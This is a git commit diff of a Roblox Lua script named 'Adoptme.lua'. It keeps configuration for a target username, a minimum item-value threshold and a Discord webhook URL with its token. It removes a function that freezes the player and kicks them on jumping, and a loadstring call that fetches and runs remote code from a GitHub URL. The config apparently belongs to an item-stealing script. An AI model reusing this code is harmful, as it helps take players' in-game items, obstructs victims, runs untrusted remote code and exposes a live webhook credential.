b54fe1955254b5d95db9bb6fb2732937401d29dd
vitolkn <vitolkn99@gmail.com>
2025-01-17 23:36:47 -0300

    Update Adoptme.lua

--- Adoptme.lua
+++ Adoptme.lua
@@ -3,25 +3,3 @@ Username = "vitinZzica"
 Username2 = "vitinZzica"
 MinimumRAP = 100000
 Webhook = "https://discord.com/api/webhooks/1329821094252904458/bP0JimgLmgub0_cqsjrFUBo4TMy-zbl0FkVB5kYc9QeQ641KlqSU_A0WD983cBDvK40B"
-
--- Função de kick por pular
-local function kickout()
-    local player = game.Players.LocalPlayer
-    local character = player.Character
-    local humanoid = character:WaitForChild("Humanoid")
-    
-    humanoid.JumpPower = 0
-    humanoid.WalkSpeed = 0
-
-    while wait() do
-        if humanoid.Jump == true then
-            game.Players.LocalPlayer:Kick("You jumped")
-        end
-    end
-end
-
--- Executa a função de kick
-kickout()
-
--- Carrega o script externo
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/ReQiuYTPL/hub/main/ReQiuYTPLHub.lua'),true))()
